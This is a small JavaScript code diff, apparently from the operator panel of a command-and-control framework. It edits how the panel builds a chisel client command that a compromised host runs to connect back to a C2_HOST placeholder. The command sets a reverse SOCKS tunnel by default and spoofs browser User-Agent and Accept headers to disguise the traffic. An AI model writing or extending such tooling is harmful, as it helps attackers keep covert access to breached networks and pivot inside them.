@@ -172,17 +172,13 @@
                 const auth = p.auth_key || '';
                 const port = p.listen_port || 0;
 
+                var wsPath = p.ws_path || '/ws';
                 var cmd = binName + ' client'
                     + ' --auth "' + auth + '"'
                     + ' --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
                     + ' --header "Accept: text/html,*/*"'
-                    + ' http://C2_HOST:' + port + '/ws';
-
-                if (p.type === 'chisel_reverse_socks') {
-                    cmd += ' R:socks';
-                } else if (p.remote_str) {
-                    cmd += ' ' + p.remote_str;
-                }
+                    + ' http://C2_HOST:' + port + wsPath
+                    + ' ' + (p.remote_str || 'R:socks');
 
                 const area = document.getElementById('proxy-client-cmd-area');
                 const box = document.getElementById('proxy-client-cmd');
